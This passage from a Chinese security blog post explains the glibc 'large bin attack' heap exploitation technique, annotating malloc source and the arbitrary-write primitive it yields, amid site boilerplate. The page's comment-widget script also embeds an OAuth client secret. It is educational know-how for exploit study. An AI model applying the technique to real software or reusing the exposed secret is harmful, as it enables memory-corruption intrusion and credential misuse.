+              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取表头</span>
+              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取第一个chunk</span>
+
+              <span class="token comment" spellcheck="true">/* maintain large bins in sorted order */</span>
+              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//检查是否空闲</span></code></pre>
+<p>在插入largebins之前会有3种情况：</p>
+<ul>
+<li>没有free chunk</li>
+<li>有free chunk 要插入的chunk是最小chunk</li>
+<li>有free chunk 要插入的chunk不是最小chunk<br>显然我们这里已经有一个恶意修改的large chunk(0x3f1) 了，所以会进行<strong>不是最小chunk情况</strong>：<br>这里由于我们修改了原chunk的size为0x3f1，所以会被绕过<pre class=" language-c"><code class="language-c">                   <span class="token comment" spellcheck="true">/*循环寻找size的合适位置*/</span>
+                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>
+                      <span class="token punctuation">{</span>
+                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//更新下一个fwd</span>
+                        <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//属于main_arena</span>
+                      <span class="token punctuation">}</span></code></pre>
+进入：<pre class=" language-c"><code class="language-c">                      <span class="token punctuation">{</span>
+                          <span class="token comment" spellcheck="true">/*其实是一个宏观的双向链表插入操作*/</span>
+                        victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
+                        victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+                        fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
+                        victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+                      <span class="token punctuation">}</span>
+                    bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//前一个chunk</span></code></pre>
+这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址：<pre class=" language-c"><code class="language-c">victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize
+<span class="token comment" spellcheck="true">// then</span>
+victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>
+</li>
+</ul>
+<p>也就是：</p>
+<pre class=" language-c"><code class="language-c">addr2<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//等价于</span>
+<span class="token operator">*</span><span class="token punctuation">(</span>addr2<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> victim<span class="token punctuation">;</span>  </code></pre>
+<p>所以修改了<strong>stack_var2</strong>的值。</p>
+<p>接着还存着另外一个利用：</p>
+<pre class=" language-c"><code class="language-c">bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
+victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
+victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
+fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
+bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>
+<pre class=" language-c"><code class="language-c">bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 等价于</span>
+<span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 等价于</span>
+<span class="token operator">*</span><span class="token punctuation">(</span>addr1<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>
+<p>修改了<strong>stack_var1</strong>的值。</p>
+<p>至此利用完毕。<strong>由于最后分配的还是 small bin 中的 chunk，与 large bin 中的 chunk 也无关了。</strong></p>
+<h2 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h2><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：</p>
+<ul>
+<li>可以修改一个 large bin chunk 的 data</li>
+<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被<strong>构造过的 chunk 的后面</strong></li>
+</ul>
+<p><strong>但是largebins的某个范围链表也被破坏了</strong></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/10/25/large-bin-attack/" class="b-link-green">Large Bin Attack</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'aa0bf75cc88de6c0258a',
+        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
+        repo: 'Gitalks.github.io',
+        owner: 'squarepants0',
+        admin: "squarepants0",
+        id: '2020-10-25T10-03-24',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/10/25/2019-huxaing-note/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2019--HuXaing--note">
+                        
+                        <span class="card-title">2019--HuXaing--note</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">checksec[*] '/home/matrix/PWN/note'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary fo</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category" target="_blank">
+                                    比赛复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/2019-HuXiang/" target="_blank">
+                        <span class="chip bg-color">2019--HuXiang</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/10/25/pwn-libc/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="pwn-libc">
+                        
+                        <span class="card-title">pwn-libc</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">一般题目给出的libc文件由于缺失ld文件我们无法将其与程序链接，强行链接一般都会报错
+题目给出的libc一般用来查函数或者字符串偏移，one_gadget。还有一个很重要的就是用LINUX的strings命令查看libc文件 的glibc</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/MASS/" class="post-category" target="_blank">
+                                    MASS
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/libc/" target="_blank">
+                        <span class="chip bg-color">libc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('10')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Matrix<br />'
+            + '作者: IT YUAN<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">100.3k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
